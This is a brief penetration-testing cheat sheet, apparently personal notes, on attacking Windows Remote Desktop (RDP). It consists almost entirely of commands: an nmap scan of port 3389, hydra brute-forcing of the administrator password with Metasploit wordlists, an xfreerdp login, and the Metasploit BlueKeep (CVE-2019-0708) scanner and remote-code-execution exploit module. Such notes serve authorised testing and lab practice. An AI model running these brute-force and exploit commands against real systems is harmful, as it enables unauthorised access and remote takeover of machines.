# RDP

```
nmap -Pn -sV -p3389 <ip>
```

```
use auxiliary/scanner/rdp/rdp_scanner
set RPORT <port>
```

```
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> -s <port> rdp
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> -s <port> rdp
```

```
xfreerdp /u:administrator /p:<password> /v:<ip>:<port>
```

## BlueKeep
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show targets
set target <id>
```
